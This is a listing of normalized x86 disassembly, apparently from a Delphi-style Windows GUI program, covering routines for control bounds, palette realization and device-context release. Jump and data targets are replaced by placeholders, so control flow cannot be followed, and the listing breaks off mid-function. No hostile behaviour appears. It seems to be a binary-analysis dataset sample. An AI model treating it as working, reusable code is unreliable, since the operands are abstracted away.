mov eax [ ebp - 0x10 ]
call sub_424854
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4415e0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a82c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44167e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441685
mov eax [ rw-data ]
call sub_41a890
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_441656
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_441760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4248b0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a468
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424854
test al al
je r-xdata
sub_44168c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_441760
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424484
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4416b8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a34
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424a38
mov eax [ ebp - 0x4 ]
call sub_4417ac
mov eax [ rw-data ]
call sub_41a82c
mov ebx eax
xor eax eax
push ebp
push sub_44173d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a30c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
call sub_441524
sub_441760
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424a38
mov edx ebx
mov eax [ rw-data ]
call sub_41a840
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_4417ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4431fc
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_4417d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_441814
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41ab48
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44185c
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_441918
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4419e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419ec
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403430
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_4520c0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40905c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40405c
sub_441a08
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441a6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44f18c
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_442bb8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x64 ]
pop eax
call sub_404414
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441a76
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov al 0x1
sub_441a7c
push ebx
mov ebx eax
mov eax ebx
call sub_44f1b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441ab0
push ebx
mov ebx eax
mov eax ebx
call sub_44f204
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404414
je r-xdata
mov al 0x1
pop ebx
retn
sub_441ae8
push ebx
mov ebx eax
mov eax ebx
call sub_44f240
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441b1c
push ebx
mov ebx eax
mov eax ebx
call sub_421018
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_442be8
sub_441b64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_441b84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40405c
sub_441ba8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_442ad8
sub_441bc8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_441bf4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404414
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_441c58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_442534
sub_441c78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_442520
sub_441c98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_441cb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_442c68
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4417d8
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_443b2c
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_441d90
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035c0
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_461570
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
push edi
xor ecx ecx
mov edx 0xb039
call sub_443d6c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_442558
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403430
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403234
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403234
mov eax [ edi + 0x68 ]
call sub_403234
mov eax [ edi + 0x64 ]
call sub_408bcc
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
sub_441e5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_441e84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403430
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441f0c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44220c
sub_441f2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403234
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_444b88
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403430
mov edx ebx
mov eax edi
call sub_4207e4
mov eax ebx
mov si 0xffd9
call sub_403430
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_441ff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420b74
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443d6c
sub_442088
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_442b70
jmp r-xdata
xor edx edx
mov eax esi
call sub_441f2c
sub_4420cc
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403430
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_441f0c
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403430
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_442174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4442fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_443000
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44220c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_443d6c
mov eax ebx
mov si 0xffd0
call sub_403430
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403430
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44220c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_442328
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44234c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_442374
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_442398
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_4423bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4424b7
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403430
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424be
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a604
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403430
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403430
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a30c
sub_4424c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_443000
mov edx edi
mov eax ebx
call sub_442578
mov edx edi
mov eax ebx
call sub_443e10
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_442534
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_442578
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4425d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_442600
mov edx eax
mov ecx esp
mov eax esi
call sub_41900c
mov edx esp
mov eax ebx
call sub_442a44
pop ecx
pop edx
pop esi
pop ebx
retn
sub_442618
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4425bc
mov ecx esp
mov edx esi
call sub_41900c
mov edx esp
mov eax ebx
call sub_442a44
pop ecx
pop edx
pop esi
pop ebx
retn
sub_442640
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4426c1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426c8
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
sub_4426d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4426fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_442728
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
